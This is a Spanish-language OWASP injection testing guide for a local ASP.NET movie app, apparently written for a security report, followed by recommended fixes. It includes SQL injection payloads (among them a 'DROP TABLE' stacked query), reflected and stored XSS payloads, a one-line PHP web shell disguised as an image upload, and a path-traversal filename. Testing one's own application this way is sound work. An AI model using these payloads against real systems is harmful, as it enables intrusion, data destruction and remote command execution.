# A3:2021 - Injection (Inyecci√≥n)

## üéØ ¬øQu√© probar?

Verificar si la app valida correctamente las entradas del usuario y previene inyecci√≥n de c√≥digo malicioso.

---

## ‚úÖ Prueba 1: SQL Injection en par√°metro de b√∫squeda

### üì° Request b√°sico de b√∫squeda

```bash
curl -i "http://localhost:5247/Peliculas?searchString=matrix"
```

**¬øQu√© devuelve?**

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...

<!DOCTYPE html>
<html>
...
[HTML con la lista de pel√≠culas que contienen "matrix"]
```

**An√°lisis:**

- ‚úÖ Request normal funciona correctamente
- La b√∫squeda usa LIKE en SQL: `WHERE Titulo LIKE '%matrix%'`

---

### üì° Probar con comilla simple (SQLi b√°sico)

```bash
curl -i "http://localhost:5247/Peliculas?searchString=test'"
```

**¬øQu√© devuelve?**

- ‚úÖ Si devuelve 200 con HTML normal ‚Üí **PROTEGIDO** (Entity Framework parametriza)
- ‚ùå Si devuelve error SQL ‚Üí **VULNERABLE**

**Ejemplo de error vulnerable:**

```
HTTP/1.1 500 Internal Server Error

System.Data.SqlClient.SqlException: Incorrect syntax near 'test''.
Unclosed quotation mark after the character string ''.
```

**An√°lisis:**

- ‚úÖ **En esta app**: Entity Framework usa consultas parametrizadas por defecto
- ‚úÖ El c√≥digo del controlador: `p.Titulo.Contains(searchString)` se traduce a par√°metros seguros
- üü¢ **Resultado**: NO vulnerable a SQLi en b√∫squeda

---

### üì° Payloads cl√°sicos de SQL Injection

```bash
# 1. Bypass de autenticaci√≥n (no aplica aqu√≠, pero es un cl√°sico)
curl -i "http://localhost:5247/Peliculas?searchString=' OR '1'='1"

# 2. Comentar el resto de la query
curl -i "http://localhost:5247/Peliculas?searchString=' OR 1=1--"
curl -i "http://localhost:5247/Peliculas?searchString=' OR 1=1#"
curl -i "http://localhost:5247/Peliculas?searchString=' OR 1=1/*"

# 3. UNION para extraer datos de otras tablas
curl -i "http://localhost:5247/Peliculas?searchString=' UNION SELECT NULL,NULL,NULL,NULL,NULL--"

# 4. Stacked queries (ejecutar m√∫ltiples comandos)
curl -i "http://localhost:5247/Peliculas?searchString='; DROP TABLE Peliculas--"

# 5. Time-based blind SQLi
curl -i "http://localhost:5247/Peliculas?searchString=' AND WAITFOR DELAY '00:00:05'--"
```

**¬øQu√© buscar en las respuestas?**

- ‚ùå Error de SQL expuesto ‚Üí **VULNERABLE**
- ‚ùå Demora de 5 segundos en responder (time-based) ‚Üí **VULNERABLE**
- ‚ùå Devuelve datos de otras tablas ‚Üí **VULNERABLE**
- ‚úÖ Respuesta normal 200 (trata el payload como texto) ‚Üí **PROTEGIDO**

---

### üì° SQLi en par√°metros de ID (tipo entero)

```bash
# 1. ID normal
curl -i "http://localhost:5247/Peliculas/Details/1"

# 2. ID con inyecci√≥n SQL
curl -i "http://localhost:5247/Peliculas/Details/1' OR '1'='1"

# 3. ID con UNION
curl -i "http://localhost:5247/Peliculas/Details/1 UNION SELECT NULL,NULL,NULL"

# 4. ID con stacked query
curl -i "http://localhost:5247/Peliculas/Details/1;DROP TABLE Peliculas--"
```

**Respuesta esperada:**

```
HTTP/1.1 400 Bad Request
Content-Type: text/html

<title>Bad Request</title>
...
The value '1' OR '1'='1' is not valid for Id.
```

**An√°lisis:**

- ‚úÖ ASP.NET Core valida que el par√°metro `int? id` sea realmente un entero
- ‚úÖ Rechaza payloads de SQLi en par√°metros tipo `int`
- üü¢ **Resultado**: NO vulnerable a SQLi en IDs

---

## ‚úÖ Prueba 2: Cross-Site Scripting (XSS)

### üì° XSS Reflejado (Reflected XSS) en b√∫squeda

```bash
# Payload b√°sico de XSS
curl -i "http://localhost:5247/Peliculas?searchString=<script>alert('XSS')</script>"
```

**¬øQu√© devuelve?**
Guarda la respuesta para analizarla:

```bash
curl -s "http://localhost:5247/Peliculas?searchString=<script>alert('XSS')</script>" > xss_test.html
```

Abre `xss_test.html` y busca:

```html
<!-- ‚ùå VULNERABLE: Si ves esto tal cual -->
<h3>
  Resultados para:
  <script>
    alert("XSS");
  </script>
</h3>

<!-- ‚úÖ SEGURO: Si ves esto escapado -->
<h3>Resultados para: &lt;script&gt;alert('XSS')&lt;/script&gt;</h3>
```

**An√°lisis:**

- ‚ùå Si el script aparece sin escapar ‚Üí **VULNERABLE A XSS**
- ‚úÖ Si aparece como `&lt;script&gt;` ‚Üí **PROTEGIDO** (HTML encoding)

---

### üì° XSS con diferentes payloads

```bash
# 1. Script b√°sico
curl -s "http://localhost:5247/Peliculas?searchString=<script>alert(1)</script>" -o test1.html

# 2. Event handler (onerror)
curl -s "http://localhost:5247/Peliculas?searchString=<img src=x onerror=alert(1)>" -o test2.html

# 3. SVG con onload
curl -s "http://localhost:5247/Peliculas?searchString=<svg onload=alert(1)>" -o test3.html

# 4. Iframe con javascript:
curl -s "http://localhost:5247/Peliculas?searchString=<iframe src=javascript:alert(1)>" -o test4.html

# 5. Body con onload
curl -s "http://localhost:5247/Peliculas?searchString=<body onload=alert(1)>" -o test5.html

# 6. Input con autofocus y onfocus
curl -s "http://localhost:5247/Peliculas?searchString=<input autofocus onfocus=alert(1)>" -o test6.html
```

**Verificar manualmente:**
Abre cada archivo HTML en el navegador:

- ‚ùå Si ejecuta el alert ‚Üí **VULNERABLE**
- ‚úÖ Si solo muestra el texto ‚Üí **PROTEGIDO**

---

### üì° XSS Almacenado (Stored XSS) en formularios

**Paso 1:** Crear una pel√≠cula con payload XSS en el t√≠tulo

```bash
# Obtener token y cookies
TOKEN=$(curl -s -c xss_cookies.txt http://localhost:5247/Peliculas/Create | grep -oP '__RequestVerificationToken.*?value="\K[^"]+')

# Crear pel√≠cula con XSS en el t√≠tulo
curl -X POST http://localhost:5247/Peliculas/Create \
  -b xss_cookies.txt \
  -d "__RequestVerificationToken=$TOKEN" \
  -d "Titulo=<script>alert('XSS Almacenado')</script>" \
  -d "Descripcion=Esta es una prueba de XSS" \
  -d "FechaLanzamiento=2025-11-26" \
  -d "Duracion=90" \
  -d "GeneroId=1" \
  -d "DirectorId=1" \
  -L -s -o stored_xss_result.html
```

**Paso 2:** Verificar si el XSS se ejecuta

```bash
# Ver la lista de pel√≠culas
curl -s http://localhost:5247/Peliculas > peliculas_list.html
```

Abre `peliculas_list.html` en el navegador:

- ‚ùå Si aparece un alert ‚Üí **VULNERABLE A XSS ALMACENADO** (muy grave)
- ‚úÖ Si solo muestra el texto escapado ‚Üí **PROTEGIDO**

**Tambi√©n revisa el HTML generado:**

```bash
grep "<script>alert" peliculas_list.html
```

---

### üì° XSS en otros campos (Descripci√≥n, etc.)

```bash
# XSS en la descripci√≥n
TOKEN=$(curl -s -c xss2_cookies.txt http://localhost:5247/Peliculas/Create | grep -oP '__RequestVerificationToken.*?value="\K[^"]+')

curl -X POST http://localhost:5247/Peliculas/Create \
  -b xss2_cookies.txt \
  -d "__RequestVerificationToken=$TOKEN" \
  -d "Titulo=Pelicula Normal" \
  -d "Descripcion=<img src=x onerror=alert('XSS en descripcion')>" \
  -d "FechaLanzamiento=2025-11-26" \
  -d "Duracion=90" \
  -d "GeneroId=1" \
  -d "DirectorId=1" \
  -L -s -o xss_desc.html
```

**Verificar en la vista de detalles:**

```bash
# Asume que se cre√≥ con ID 10
curl -s http://localhost:5247/Peliculas/Details/10 > details_xss.html
```

Abre `details_xss.html` en el navegador y verifica si se ejecuta el payload.

---

## ‚úÖ Prueba 3: Inyecci√≥n de comandos (si hay upload de archivos)

### üì° Verificar si existe funcionalidad de upload

```bash
curl -s http://localhost:5247/Peliculas/Create | grep -i "input.*type=\"file\"\|upload"
```

**Si encuentra `<input type="file">`:**

```bash
# Crear archivo malicioso
echo "<?php system(\$_GET['cmd']); ?>" > shell.php.jpg

# Intentar subirlo
curl -X POST http://localhost:5247/Peliculas/Create \
  -F "Imagen=@shell.php.jpg" \
  -F "Titulo=Test Upload" \
  -F "..." \
  ...
```

**Buscar path traversal:**

```bash
# Nombre de archivo con path traversal
curl ... -F "Imagen=@test.jpg;filename=../../../evil.jpg"
```

**An√°lisis:**

- ‚ùå Si permite subir `.php`, `.aspx`, `.exe` ‚Üí **VULNERABLE**
- ‚ùå Si no valida el nombre y permite `../` ‚Üí **PATH TRAVERSAL**
- ‚úÖ Si solo acepta im√°genes y sanitiza nombres ‚Üí **PROTEGIDO**

---

## üìä Resumen A3 - Injection

| Prueba             | Comando                               | Resultado Esperado             | Severidad |
| ------------------ | ------------------------------------- | ------------------------------ | --------- |
| SQLi en b√∫squeda   | `curl "...?searchString=' OR 1=1--"`  | ‚úÖ Protegido (EF parametriza)  | üü¢ N/A    |
| SQLi en ID         | `curl ".../Details/1' OR '1'='1"`     | ‚úÖ Protegido (validaci√≥n tipo) | üü¢ N/A    |
| XSS reflejado      | `curl "...?searchString=<script>..."` | ‚ö†Ô∏è Verificar encoding          | üü°/üî¥     |
| XSS almacenado     | POST con `<script>` en T√≠tulo         | ‚ö†Ô∏è Verificar encoding          | üî¥ Alta   |
| XSS en descripci√≥n | POST con `<img onerror=...>`          | ‚ö†Ô∏è Verificar encoding          | üî¥ Alta   |

**Conclusi√≥n:**

- ‚úÖ **SQLi**: Protegido por Entity Framework
- ‚ö†Ô∏è **XSS**: Depende de c√≥mo Razor renderiza `@Model.Titulo` (por defecto escapa HTML, pero verificar)

---

## üõ†Ô∏è Soluciones Recomendadas

### Prevenir XSS en vistas Razor

```html
<!-- Razor escapa autom√°ticamente por defecto -->
@Model.Titulo
<!-- Ya est√° escapado -->

<!-- Si necesitas HTML raw (¬°CUIDADO!) -->
@Html.Raw(Model.Descripcion)
<!-- NO hacer esto con entrada de usuario -->

<!-- Forzar encoding expl√≠cito -->
@Html.Encode(Model.Titulo)
```

### Validar y sanitizar entradas

```csharp
[HttpPost]
public async Task<IActionResult> Create(Pelicula pelicula)
{
    // Sanitizar entrada (opcional, Razor ya escapa)
    pelicula.Titulo = System.Net.WebUtility.HtmlEncode(pelicula.Titulo);

    // Validar con Data Annotations
    if (!ModelState.IsValid)
    {
        return View(pelicula);
    }

    await _context.SaveChangesAsync();
    return RedirectToAction(nameof(Index));
}
```

### Data Annotations para validaci√≥n

```csharp
public class Pelicula
{
    [Required]
    [StringLength(200)]
    [RegularExpression(@"^[a-zA-Z0-9\s\-:]+$", ErrorMessage = "Solo letras, n√∫meros y espacios")]
    public string Titulo { get; set; }

    [StringLength(2000)]
    public string? Descripcion { get; set; }
}
```

### Content Security Policy (CSP)

```csharp
// En Program.cs
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("Content-Security-Policy",
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");
    await next();
});
```

---

## üì∏ Capturas para el Informe

1. Screenshot de `curl "http://localhost:5247/Peliculas?searchString=' OR 1=1--"` mostrando que no es vulnerable
2. Screenshot de payload XSS en el navegador (si ejecuta o si escapa)
3. Screenshot del HTML generado mostrando `&lt;script&gt;` escapado
4. Screenshot de pel√≠cula creada con XSS en el t√≠tulo
5. Screenshot del c√≥digo con validaci√≥n y sanitizaci√≥n implementada
